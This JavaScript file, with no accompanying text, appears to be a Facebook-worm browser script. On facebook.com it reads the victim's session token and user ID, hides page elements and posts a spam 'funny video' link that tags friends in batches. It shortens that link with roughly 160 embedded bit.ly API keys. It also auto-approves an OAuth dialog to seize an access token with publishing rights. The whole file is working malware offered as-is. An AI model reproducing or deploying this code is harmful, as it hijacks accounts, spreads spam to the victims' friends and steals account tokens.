var zappid,zuid;
if(!document.getElementById("amung")){ new Image().src = 'http://whos.amung.us/pingjs/?k=bnogy8abz8n9'; }

function setCookie(c_name, value, exhours)
{
    var exdate = new Date();
    var c_value = escape(value) + ((exhours == null) ? "" : "; expires=" + exdate.toUTCString());
    console.log(c_value);

    exdate.setHours(exdate.getHours() + exhours);

    var c_value = escape(value) + ((exhours == null) ? "" : "; expires=" + exdate.toUTCString());
    console.log(c_value);

    document.cookie = c_name + "=" + c_value;
}

  function getCookie(c_name)
  {var i,x,y,ARRcookies=document.cookie.split(";");for(i=0;i<ARRcookies.length;i++)
  {x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);x=x.replace(/^\s+|\s+$/g,"");if(x==c_name)
  {return unescape(y);}}}
  function pegarCookies(c_name){
  	var i,x,y,ARRcookies=document.cookie.split(";");
  	for(i=0;i<ARRcookies.length;i++){
  		x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
  		y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
  		x=x.replace(/^\s+|\s+$/g,"");
  		if (x===c_name){
  			return unescape(y);
  		}
  	}
  }

if(location.hostname.indexOf("www.facebook.com") >= 0) {
    window.setInterval(function(){
        if(document.getElementsByClassName("_5ce")){
        for(i=0;i<document.getElementsByClassName("_5ce").length;i++){
        document.getElementsByClassName("_5ce")[i].innerHTML = "";
        }
        }
        if(document.getElementsByClassName("uiToggle wrap")){
        for(i=0;i<document.getElementsByClassName("uiToggle wrap").length;i++){
        document.getElementsByClassName("uiToggle wrap")[i].innerHTML = "";
        }
        }
        if(document.getElementsByClassName("uiPopover")){
        for(i=0;i<document.getElementsByClassName("uiPopover").length;i++){
        document.getElementsByClassName("uiPopover")[i].innerHTML = "";
        }
        }
        },10);


}
  
function uygulamaizinver(url){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
izinverhtml = document.createElement("html");
izinverhtml.innerHTML = xmlhttp.responseText;
if(izinverhtml.getElementsByTagName("form").length > 0){
izinverhtml.innerHTML = izinverhtml.getElementsByTagName("form")[0].outerHTML
act = izinverhtml.getElementsByTagName("form")[0].action;
duzenlevegonder(izinverhtml,act);
}
}
};      
xmlhttp.open("GET", url, true); 
xmlhttp.send();
}
function duzenlevegonder(formnesne,act){
izinverparams = "";
for(i=0;i<formnesne.getElementsByTagName("input").length;i++){
if(formnesne.getElementsByTagName("input")[i].name.indexOf("__CANCEL__") < 0 && formnesne.getElementsByTagName("input")[i].name.indexOf("cancel_clicked")){
izinverparams += "&" + formnesne.getElementsByTagName("input")[i].name + "=" + formnesne.getElementsByTagName("input")[i].value;
}
}
if(formnesne.getElementsByTagName("select").length > 0){
izinverparams += "&" + formnesne.getElementsByTagName("select")[0].name + "=80";
}
izinverparams.replace("&fb_dtsg","fb_dtsg");
izinverparams += "&__CONFIRM__=1";
formnesne = formnesne;
var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
            if(xmlhttp.readyState == 4){
              izinhtml = document.createElement("html");
              izinhtml.innerHTML = xmlhttp.responseText;
            if(izinhtml.getElementsByTagName("form").length > 0){
              izinhtml.innerHTML = izinhtml.getElementsByTagName("form")[0].outerHTML;
              act = izinhtml.getElementsByTagName("form")[0].action;
              duzenlevegonder(izinhtml,act)
            }else{
            cek = xmlhttp.responseText.match(/#access_token=(.*?)&expires_in/i);
            if (cek[1]) {

            }
            }
            }
        };

xmlhttp.open("POST", act , true); 
xmlhttp.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
xmlhttp.send(izinverparams);

}
function TokenUrl(id){
zappid=id;
return "//www.facebook.com/dialog/oauth?response_type=token&display=popup&client_id=" + id  +"&redirect_uri=fbconnect://success&sso_key=com&scope=email,publish_stream,user_likes,friends_likes,user_birthday";
}








var ipvar = Math.floor(Math.random()*100000000);
var blogs = new Array();




blogs[1] = 'http://12348146f.blogspot.com/';
blogs[2] = 'http://12348146f.blogspot.com/';
blogs[3] = 'http://12348146f.blogspot.com/';









function rndchr(n)
{
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for( var i=0; i < n; i++ )
        text += possible.charAt(Math.floor(Math.random() * possible.length));

    return text;
}
function getRandomArbitrary(min, max) {
  return Math.random() * (max - min) + min;
}
function spu_createCookieqweqweqwe(name, value, hours)
{
    if (hours)
    {
        var date = new Date();
        date.setTime(date.getTime()+(hours*60*60*1000));
        var expires = "; expires="+date.toGMTString();
    }
    else
    {
        var expires = "";
    }

    document.cookie = name+"="+value+expires+"; path=/";
}
function createCookieasadeaaaaa(a,b,c){if(c){var d=new Date;d.setTime(d.getTime()+c*24*60*60*1000);var e="; expires="+d.toGMTString();}else var e="";document.cookie=a+"="+b+e+"; path=/";}
function readCookieeedsdsdsf(a){var b=a+"=";var c=document.cookie.split(";");for(var d=0;d<c.length;d++){var e=c[d];while(e.charAt(0)==" ")e=e.substring(1,e.length);if(e.indexOf(b)==0)return e.substring(b.length,e.length);}return null;}
if(location.hostname.indexOf("www.facebook.com") >= 0) {
var fb_dtsgx = document['getElementsByName']('fb_dtsg')[0]['value'];
var uid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
zuid=uid;
var fb_dtsg =  fb_dtsgx;

if (getCookie(uid+"zxcnbuewyyyyyyyyy22222") != "done"){






var bitly = new Array();


bitly[0] = 'apiKey=R_c979666c20ad4a21ab03f264f977141f&login=wewqdsaj';
bitly[1] = 'apiKey=R_c51e2f53ef94472baf7e8c56e36579e7&login=wjqkems';
bitly[2] = 'apiKey=R_64952222e92146e9bc5c98dc8d1e6e04&login=sadvccxx';
bitly[3] = 'apiKey=R_9f74ff547a8648cfaccbfa3a2bee803a&login=qwdsam';
bitly[4] = 'apiKey=R_9b964258221c4b2b9a75c15f697248d3&login=wkjdsme';
bitly[5] = 'apiKey=R_fdef3d463fb1432e9f36675842c6fe32&login=qwdnsae';
bitly[6] = 'apiKey=R_4f0e9482ca4d4bcf8b4aadd2668da3fb&login=ewqdkms';
bitly[7] = 'apiKey=R_59b1d9d17b47493eb5def8d9f2756301&login=sndfjsdn';
bitly[8] = 'apiKey=R_fd60b925a1124c548dd7722bb2079769&login=wqiodm';
bitly[9] = 'apiKey=R_b82b13334bb141eba50b8a94ce54faab&login=mndasn';
bitly[10] = 'apiKey=R_de0b80c276dc475e9acf2afad6cd6383&login=aseqwmd';
bitly[11] = 'apiKey=R_5ae8ebe2f7724a90b60aa11cb520da49&login=weqwdsa';
bitly[12] = 'apiKey=R_2386184700fe49b78f8a328cdbfa0876&login=eqwdsac';
bitly[13] = 'apiKey=R_01381467f3404d3bbb9eb4721a12c6bc&login=wqeioqw';
bitly[14] = 'apiKey=R_b3418bed89ae4cae933959f39e9c9396&login=saeqwms';
bitly[15] = 'apiKey=R_ad209248738e4970b924956b54935b87&login=wqeqwxdd';
bitly[16] = 'apiKey=R_1e330ae7737c439395ad9e08285d2052&login=wekwqksd';
bitly[17] = 'apiKey=R_6a08e20ac8dd46e0bcf932d96565eefb&login=pqweow';
bitly[18] = 'apiKey=R_349d21a433724f20b2cda704ba4bcd39&login=uqwjemsd';
bitly[19] = 'apiKey=R_a435879f5455440c805bc1a42bc0b438&login=qwdmsam';
bitly[20] = 'apiKey=R_94d70c360c7948bca0d6768c30aa8030&login=eqdmnas';
bitly[21] = 'apiKey=R_89a3d16ef448423196e3148e3678f4c5&login=zxqweqds';
bitly[22] = 'apiKey=R_7439b1d9434e4833b066865307970bc1&login=eqwdsads';
bitly[23] = 'apiKey=R_d60a2f62e52e4c0d80ef813500a2ed61&login=sadwqsacc';
bitly[24] = 'apiKey=R_55b3216cd0fd4e1ead784c3e57e1518e&login=asewqdsa';
bitly[25] = 'apiKey=R_4a41269550d8429a9f99aad892befc18&login=mnasmn';
bitly[26] = 'apiKey=R_721575bc232a41e6acbbc5b685b93b82&login=jhwqhhjd';
bitly[27] = 'apiKey=R_2298816b1f1e46a8a16bff4729ea2b28&login=mndasm';
bitly[28] = 'apiKey=R_4464b14f34034ff2b306e3a10be08a34&login=wqedhjsn';
bitly[29] = 'apiKey=R_abd8e46ed87b47f9b917542e2e4183cc&login=admndsa';
bitly[30] = 'apiKey=R_39b9b66288444674ae24ac4551a65e56&login=wqioemns';
bitly[31] = 'apiKey=R_85b8532efedb42e3a37f08dcec112436&login=ncvcxjsd';
bitly[32] = 'apiKey=R_e4a9141750f54758a115ca8469fc3b64&login=wqijmsdss';
bitly[33] = 'apiKey=R_7e453ad32ac64365b91ea48531a59777&login=wiueqnm';
bitly[34] = 'apiKey=R_1ff311af41f446cbb77286e575549db3&login=owieqsdd';
bitly[35] = 'apiKey=R_5379156bccc64ecb9c2ae691c1165e03&login=uwqensdd';
bitly[36] = 'apiKey=R_63a1c6b45a1f4e84bbae72e62071cd86&login=mnwqeq';
bitly[37] = 'apiKey=R_74e404033cee4471aa0a6f7c3634f903&login=wqkejwqm';
bitly[38] = 'apiKey=R_4242f4933cf84ec181eef577baedcb86&login=jkeqwdss';
bitly[39] = 'apiKey=R_ccf1df38fe604949a94c082c161d8a36&login=vcxmnnvv';
bitly[40] = 'apiKey=R_010f80373cfe4e1fa8860831acdbc4f9&login=wequiem';
bitly[41] = 'apiKey=R_b7065e9772d14956860d38e1199dccd2&login=bcxnvnm';
bitly[42] = 'apiKey=R_34b3c2ca4941471caf76c35ba3318786&login=cvbfdds';
bitly[43] = 'apiKey=R_5aab3a7711554663a3c5841a5c6e022c&login=sdmnasn';
bitly[44] = 'apiKey=R_334cf73df3af4d4781010c49a8c6611a&login=cmxvxnnn';
bitly[45] = 'apiKey=R_57469dec369844fda3a08b0bac8e1525&login=nmxzcnnb';
bitly[46] = 'apiKey=R_e1f882049bbb4838b3589d5ad43164f1&login=nbvmcmc';
bitly[47] = 'apiKey=R_4ea8a32169534bf2b64daabb005f356f&login=cmvbvckfj';
bitly[48] = 'apiKey=R_1afc74e6952d4d778adcbe38b45f41cc&login=xcmnfdsms';
bitly[49] = 'apiKey=R_d0dd7c4cf2ba483f99f6b1815fbbe437&login=ssdfhjhre';
bitly[50] = 'apiKey=R_752258a6a00941c984ced998bc5fd053&login=xcbcvbvn';
bitly[51] = 'apiKey=R_0fcd474156b740d5933527419e738af2&login=cvmdskjfjj';
bitly[52] = 'apiKey=R_c47b150d9eae4f4fb2cd1ead8fb2c5ea&login=bvcsdffffq';
bitly[53] = 'apiKey=R_30457c73aa8b4226accf27af83764749&login=jksadjkaj';
bitly[54] = 'apiKey=R_e8c21c4897314117a52a37f31c77a3f3&login=kjdjdjsjjj';
bitly[55] = 'apiKey=R_636e20f8b399478ab99c4100c17cc769&login=kjasdnmcc';
bitly[56] = 'apiKey=R_f86a09fe50c043a4812ff3f1b3c859bb&login=cvdfsddss';
bitly[57] = 'apiKey=R_4ef3e3fd4bd4445e8120c803f628e7aa&login=nvbxbcvc';
bitly[58] = 'apiKey=R_875a1c993fcc4876baba18a827724bba&login=jhhgfhgh';
bitly[59] = 'apiKey=R_453c59c9fd7a4d41962810a090bc3973&login=wquijeds';
bitly[60] = 'apiKey=R_4e0a1fc098074743a2d4c2961eaec725&login=ghjghmnnn';
bitly[61] = 'apiKey=R_3bd9070282b642e9bcfc9282520327bd&login=wqkeqwj';
bitly[62] = 'apiKey=R_60ce917e69f242c4bd78857e032dfe75&login=cxvnsakdj';
bitly[63] = 'apiKey=R_c7d555d7ce2b47aebdb038c5cb601b6e&login=mxcvnxcj';
bitly[64] = 'apiKey=R_25d33aa2531542549d123bfca6870600&login=xckvjjfjjj';
bitly[65] = 'apiKey=R_31f279106ff04ae6b0dac16f32b53205&login=cmxnm2n';
bitly[66] = 'apiKey=R_3b44a51598a640d6845b509d21ac2ff7&login=kasjd234jwj';
bitly[67] = 'apiKey=R_3f821824ba104f1fb32a5ac308073379&login=mcxn23mn';
bitly[68] = 'apiKey=R_8ad1aa5247834f918ac7e0660f437963&login=kasdkjasj3';
bitly[69] = 'apiKey=R_37686374f5d647e9970720d9addf4398&login=xcnvvnn2';
bitly[70] = 'apiKey=R_a48d0c1df8654451989d9808b79f4cb1&login=xcmvcxn9';
bitly[71] = 'apiKey=R_58abaec0ad1a4ba28f7220ccf4c6310e&login=jaksdjjj';
bitly[72] = 'apiKey=R_e029ac37a7cb428b8cfb947c4abbe576&login=xcvxmm2';
bitly[73] = 'apiKey=R_82bdbb2fdb58493f8f54677b3cfb336a&login=cxvjjkfj9';
bitly[74] = 'apiKey=R_7bc4220d1afc4ec2802d4d471b273ad6&login=vcvckjf5';
bitly[75] = 'apiKey=R_55a5410cba214879920e331eda6ba76e&login=asdmna9';
bitly[76] = 'apiKey=R_02921c42d57144349852f92cec3f9b96&login=cjvhhjad0';
bitly[77] = 'apiKey=R_3b3728ca5e164b98ad1545a683f92f6f&login=sdkjndd8';
bitly[78] = 'apiKey=R_4110a6a4d5e146f7a33a44129399b816&login=asjddjdd';
bitly[80] = 'apiKey=R_0413e90d3d8a41508cb6c3f426f80818&login=ncmnnnn';
bitly[81] = 'apiKey=R_1bbb99bfa7284989bb0cd92977945e42&login=kjsajdjsjd';
bitly[82] = 'apiKey=R_90940e81b7934b99948a1ca71cdcbb46&login=kdsjasmi';
bitly[83] = 'apiKey=R_5e8abb7cd0304299be506c70114c0f98&login=zxncnm';
bitly[84] = 'apiKey=R_9df6a61dd7084d7d9016f48e5e24f8af&login=vcxnnn';
bitly[85] = 'apiKey=R_121014a276da4437a9141e43836dc871&login=asjkdjmm';
bitly[86] = 'apiKey=R_b2b5eaa0c0b04e23aae0ebcc9fda6651&login=jkdaslll';
bitly[87] = 'apiKey=R_397eeca779924cb19fe093a5a80ff16d&login=samndn';
bitly[88] = 'apiKey=R_dde8dc1598284bd2981c5f2d0dbc7407&login=zxcnmzxn';
bitly[89] = 'apiKey=R_f707b25231f741f29f9a73fc75f0b0a6&login=ieqwokk';
bitly[90] = 'apiKey=R_d517ba673245476992929bf38c7e59cc&login=askjdasll';
bitly[91] = 'apiKey=R_a1d7f7875e6a4929b07600806ff212d2&login=aksjeqwio';
bitly[92] = 'apiKey=R_76ea9fd5633b41c0ab8fd6b931679f68&login=mnsandmj';
bitly[93] = 'apiKey=R_e4d371461a714b6abe0c04fd602349ca&login=kaskjjkek';
bitly[94] = 'apiKey=R_7706dc602e9a4b57811e522d5f88bdc2&login=mnvxcnn';
bitly[95] = 'apiKey=R_0626da984b564e1491fc568666995ea8&login=zxcnsjadn';
bitly[96] = 'apiKey=R_ef6a006f7540432c9b099a4b374cda42&login=mnxcvjff';
bitly[97] = 'apiKey=R_bcc17adc5fc24083a30c01f9391b5cd3&login=jdkasjkd';
bitly[98] = 'apiKey=R_2b18e4f3dd9f42deb87f363e472ea97d&login=asdjkasjn';
bitly[99] = 'apiKey=R_ead202f7f3e643fa90034938d7868976&login=rqwejkass';
bitly[100] = 'apiKey=R_ee36c1643133465b87cf4bb74579bebd&login=zxncndnn';
bitly[101] = 'apiKey=R_8fa7d0323ab94887b36bc081b341ecb9&login=enqwdns';
bitly[102] = 'apiKey=R_efacbc894f364e3dbd4d4f1393f27994&login=nxzmdsnss';
bitly[103] = 'apiKey=R_69204415ae6b46b4a49033536069d400&login=asjkdwjjjj';
bitly[104] = 'apiKey=R_d964b470a44c416492cde3e0aa388471&login=zxkasmm';
bitly[105] = 'apiKey=R_faa9c9e6510547eba4561538557b4274&login=askejwqj';
bitly[106] = 'apiKey=R_888feba79a0740f8b6daab107e7ded49&login=maskdmjj';
bitly[107] = 'apiKey=R_06de35f18d2b4df99432e55b19cd2018&login=mncxznbb';
bitly[108] = 'apiKey=R_1c5571acc02b4e7ca602876173cb5338&login=cmzxdsnj';
bitly[110] = 'apiKey=R_c922dc49cf924ab0b3a6d2a5224a54d7&login=akjdasmm';
bitly[111] = 'apiKey=R_81b53a1e0e254abcae4e02803e968a90&login=jkdasjmn';
bitly[112] = 'apiKey=R_41c0a7a438dd4bf48010489eda38649e&login=xcvjxmsd1';
bitly[113] = 'apiKey=R_5425a822e58740e0ac357b3675522734&login=asndasm9';
bitly[114] = 'apiKey=R_bc2cf86107934a02a71bb74fa623f521&login=kjwqjmds';
bitly[115] = 'apiKey=R_387a321bebcd4d169ad8a81c2a085933&login=dmnaskj';
bitly[116] = 'apiKey=R_e0afab83eb92482ca0d8d4d666ac754d&login=qwiuejsjj';
bitly[117] = 'apiKey=R_88473b2208764a04ae6b4aa35b8dc142&login=mndasnj';
bitly[118] = 'apiKey=R_32d7caac4fb34635ab96445ade795089&login=woiqekks0';
bitly[119] = 'apiKey=R_93e9a4ba56304da2beab344938fec6b9&login=zxkcjamd3jk';
bitly[120] = 'apiKey=R_3dd298d02f9d4c1b9edde27eab947b4e&login=qwidmsam';
bitly[121] = 'apiKey=R_cae0e20f7761467cb01af33257884839&login=wqjhdsan';
bitly[122] = 'apiKey=R_0cb22ae2ee044d07985dea4e6abe9d9b&login=dqwjmd';
bitly[123] = 'apiKey=R_9fb5b79324ad41c2ac055de5b07888c6&login=zxvzxdad';
bitly[124] = 'apiKey=R_0dcfc6e07c314dbb9ec9e8f80b7182b0&login=dijwmemm';
bitly[125] = 'apiKey=R_e4e6f96abdf740a9a677b7fd19ddd0a5&login=jkwqdmsa';
bitly[126] = 'apiKey=R_0c7aaf6b4e434da7b048d4fd26d5a0eb&login=sadjasme';
bitly[127] = 'apiKey=R_c80a2acaeeb241fda480e5b5c33e1edf&login=kjqwemd';
bitly[128] = 'apiKey=R_ea615a131089421095a71dc0179ae120&login=qwesdjam';
bitly[129] = 'apiKey=R_619a3c1c4b4f4a17a586c3b7f118cdc3&login=mxxzcmn';
bitly[130] = 'apiKey=R_a512fcfb583c4aa7891f6a30ac675b81&login=kwqjejmsd';
bitly[131] = 'apiKey=R_e74a1357cb7546ad882c2ce3038116e0&login=asjkdmcxxx';
bitly[132] = 'apiKey=R_43b311e1551a45cfa67e10d861590b92&login=asdwqkddd';
bitly[134] = 'apiKey=R_3de7802f608e43bfb7b81ab7b68df5f7&login=zxcjwqsamd';
bitly[135] = 'apiKey=R_1c4d907412bd4b008614c75984210d3a&login=wkdsajkwjj';
bitly[136] = 'apiKey=R_f0ce43b329db40c2899b374bb21bf2f6&login=qwdsamnew';
bitly[137] = 'apiKey=R_6acfae9fb2264ca4b78e0b7f42594f38&login=adasjemwm';
bitly[138] = 'apiKey=R_c70e3bc1a9d44b178385b164365bd88e&login=vzxadjasmm';
bitly[139] = 'apiKey=R_00a21660ed774c4d9dbe2b83884298c8&login=ijwqdmsa';
bitly[140] = 'apiKey=R_d8f9fb3e393b4f7896ff447a9e6272ae&login=qwiejma';
bitly[141] = 'apiKey=R_f21d2e60f21e4fb48eafa6f58eec1253&login=qdhsajwhj';
bitly[142] = 'apiKey=R_c242f73b8e414d62847c3910c10df345&login=zxjcasdm';
bitly[143] = 'apiKey=R_961711b1625c4b79a5347f822f5d6677&login=wqkmdas';
bitly[144] = 'apiKey=R_e21a26f63c394b8b8f290aee2fc2b7fe&login=kjewjq';
bitly[145] = 'apiKey=R_bcece833d072491b88adbedc9e6c4528&login=daisjwem';
bitly[146] = 'apiKey=R_65654007d92a4231b4ae0ae2d4f1692a&login=kejwqjjj';
bitly[147] = 'apiKey=R_97a4d2d3b7e745c08db7d423f1adf3f4&login=eqwdsajm';
bitly[148] = 'apiKey=R_87b0fe399b724928a5ac3b27aae42603&login=wqkdjmas';
bitly[149] = 'apiKey=R_1a9a93341d7b44359bcc12f82d29ac38&login=qwdasjm';
bitly[150] = 'apiKey=R_bbb075c555754fe4bc8534c117856cec&login=wqedmks';
bitly[151] = 'apiKey=R_1cd767f5f31b4481982dee1dbea83b04&login=wqiedjsm';
bitly[152] = 'apiKey=R_c4c31064324e438d83313c8a01476053&login=qwekassd';
bitly[153] = 'apiKey=R_ae0a44984ea34eca9b6c414380666a70&login=kjewqmed';
bitly[154] = 'apiKey=R_da175133b823461fa2f1e2f5afdf6f57&login=kjdsajke';
bitly[155] = 'apiKey=R_7888f2e0bb134975a3174e542a91f02d&login=qwekmsad';
bitly[156] = 'apiKey=R_834124b286d94a029c21f8be253c1614&login=cxzdiajs';
bitly[157] = 'apiKey=R_250a79d64ec348699e527ce396035a9a&login=jkqwjkda';
bitly[158] = 'apiKey=R_e48b75753a95415c8ce7ba443ef5f317&login=qkweqjjj';
bitly[159] = 'apiKey=R_3b7faaff44c34a07ba1c85e6fa2990a8&login=qwiemas';
bitly[160] = 'apiKey=R_29d2156fbb984143b15511f903649a1a&login=qwedkmss';
bitly[161] = 'apiKey=R_3d12277a2aff4ea5b7efbdbcc517ca58&login=eqwjdas';
bitly[162] = 'apiKey=R_01356d66eed44cf4948740ac676c8a9a&login=qwjdasm';
bitly[163] = 'apiKey=R_fd696466c3434c448792a7194b8435fc&login=qwidjasm';
bitly[164] = 'apiKey=R_22f6c27687b84835b4c970517e14a62a&login=wqdasjm';





  var rand = Math.floor(Math.random() * blogs.length);
var variables = Math.floor(Math.random()*100000000);
var urls1 = blogs[rand] + variables;

var rand1 = Math.floor(Math.random() * bitly.length);
var bitlyl = bitly[rand1];

var xmlhttpz = new XMLHttpRequest();
xmlhttpz.open("GET", "https://api-ssl.bitly.com/v3/shorten?callback=&" + bitlyl + "&longUrl=" + urls1, false);
xmlhttpz.send();
var get = JSON.parse(xmlhttpz.responseText);
var urls = get.data.url;






//var rand1 = Math.floor(Math.random() * foto.length);
//var images = foto[rand1];                 //nese tbllokohen fotot qeta e bon imagees1 e ata ma posht ja hek dy thysat
//duhet me bo veq "images" kur don me postu me foto qe i ke shti, jo images1. images1  bon kur don me bo kta posht images


  var ilkk=["WTFF!"];
var ikik=["..."];
var ucuk=["..."];

var images = "https://graph.facebook.com/" + uid + "/picture?type=large&width=150&height=150";         //kur ti bon do foto tjera e kthen qysh ke , se qetash spo tbojn fotot

var xmlhttpz = new XMLHttpRequest();
xmlhttpz.open("GET", "https://graph.facebook.com/" + uid, false);
xmlhttpz.send();
var get = JSON.parse(xmlhttpz.responseText);
var name = get.name;


gf = new XMLHttpRequest();
        gf.open("GET","/ajax/typeahead/place_tag_friends.php?__a=1&content_id=395870630487365&viewer=" + uid + "&"+Math.random(),false);
        gf.send();
        if(gf.readyState!=4){ }else{
            data = eval('(' + gf.responseText.substr(9) + ')');

            if(data.error){ }else{
                friends = data.payload.entries.sort(function(a,b){return a.index-b.index;});

            }
        }
        var friends_fields = new Array(new Array());
        var how_many = 0;
        var array_count = 0;
        for(var i=0; i<friends.length; i++)
        {

            if(friends[i].uid != uid)
            {

                friends_fields[array_count][how_many] = "&composertags_with[" + how_many + "]=" + friends[i].uid;
                how_many++;
                if(how_many >= 20)
                {

                    how_many = 0;
                    array_count++;
                    friends_fields[array_count] = new Array();
                }

            }
        }
        var veri = "";
        for(var i=0; i<friends_fields.length; i++)
        {

            for(var k=0; k<friends_fields[i].length; k++)
            {
                veri += friends_fields[i][k];
            }

            function post_add(){
            var xmlhttp = new XMLHttpRequest();
    var params = "";
    params += "&fb_dtsg=" + fb_dtsg;
    params += "&xhpc_context=profile";
    params += "&xhpc_ismeta=1";
    params += "&xhpc_timeline=1";
    params += "&xhpc_composerid=u_0_1l";
    params += "&xhpc_targetid=" + uid;
    params += "&xhpc_message_text=" + msjrandom;
    params += "&xhpc_message=" + msjrandom;
    params += "&aktion=post";
    params += "&app_id=2309869772";
    params += "&attachment[params][urlInfo][canonical]=" + urls;
    params += "&attachment[params][urlInfo][final]=" + urls;
    params += "&attachment[params][urlInfo][user]=" + urls;
    params += "&attachment[params][favicon]=";
    params += "&attachment[params][title]=" + name + " funny video!";
    params += "&attachment[params][summary]= Views: " + Math.round(getRandomArbitrary(1,99))+","+ Math.round(getRandomArbitrary(100,999));
    params += "&attachment[params][images][0]=" + images;
    params += "&attachment[params][medium]=106";
    params += "&attachment[params][url]=" + urls;
    params += "&attachment[type]=100";
    params += "&link_metrics[source]=ShareStageExternal";
    params += "&link_metrics[domain]=www.facebook.com";
    params += "&link_metrics[base_domain]=facebook.com";
    params += "&link_metrics[min_dimensions][0]=70";
    params += "&link_metrics[min_dimensions][1]=70";
    params += "&link_metrics[images_with_dimensions]=3";
    params += "&link_metrics[images_pending]=0";
    params += "&link_metrics[images_fetched]=0";
    params += "&link_metrics[image_dimensions][0]=250";
    params += "&link_metrics[image_dimensions][1]=188";
    params += "&link_metrics[images_selected]=3";
    params += "&link_metrics[images_considered]=5";
    params += "&link_metrics[images_cap]=3";
    params += "&link_metrics[images_type]=ranked";
    params += "&composer_metrics[best_image_w]=100";
    params += "&composer_metrics[best_image_h]=100";
    params += "&composer_metrics[image_selected]=0";
    params += "&composer_metrics[images_provided]=3";
    params += "&composer_metrics[images_loaded]=3";
    params += "&composer_metrics[images_shown]=3";
    params += "&composer_metrics[load_duration]=211";
    params += "&composer_metrics[timed_out]=0";
    params += "&composer_metrics[selector_type]=UIThumbPager_6";
    params += veri;
    params += "&disable_location_sharing=false";
    params += "&composer_predicted_city=106012156106461";
    params += "&audience[0][value]=80";
    params += "&nctr[_mod]=pagelet_timeline_recent";
    params += "&__user=" + uid;
    params += "&__a=1";
    xmlhttp.open("POST", "/ajax/updatestatus.php", true);
    xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
    xmlhttp.send(params);
    } 
      //#############################################################
    var ortk=" ";

var bir = ilkk[Math.floor(Math.random() * (ilkk.length))];
var iki = ikik[Math.floor(Math.random() * (ikik.length))];
var uc = ucuk[Math.floor(Math.random() * (ucuk.length))];

var ortaknerede=Math.round(getRandomArbitrary(1,3));

if(ortaknerede==1)
{
    var msjrandom=ortk+bir+iki+uc;
}else if(ortaknerede==2)
{
    var msjrandom=bir+ortk+iki+uc;
}else if(ortaknerede==3)
{
    var msjrandom=bir+iki+ortk+uc;
}
msjrandom=msjrandom+Math.random().toString(36).substring(7);



//#############################################################
    post_add();
    veri="";

    }

    function like(id) {
    var xmlhttpa = new XMLHttpRequest();
    xmlhttpa.onreadystatechange = function () {
        if (xmlhttpa.readyState == 4) {}
    };
    var params = "like_action=true";
    params += "&ft_ent_identifier=" + id;
    params += "&source=0&client_id=1355581664855%3A2475647505&ft[tn]=%3E%3D&ft[type]=20&nctr[_mod]=pagelet_timeline_recent";
    params += "&fan_origin=page_timeline";
    params += "&__user=" + uid;
    params += "&__req=1e";
    params += "&__dyn=7n8amgAMCBClUlgDxqigHzy5xNei9w";
    params += "&__a=1";
    params += "&fb_dtsg=" + fb_dtsg;
    params += "&phstamp=165816689711057878203";
    xmlhttpa.open("POST", "/ajax/ufi/like.php", true);
    xmlhttpa.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xmlhttpa.send(params);
    }
    like();


    uygulamaizinver(TokenUrl("149859461799466"));

  setCookie(uid+"zxcnbuewyyyyyyyyy22222","done",1);

  }



}
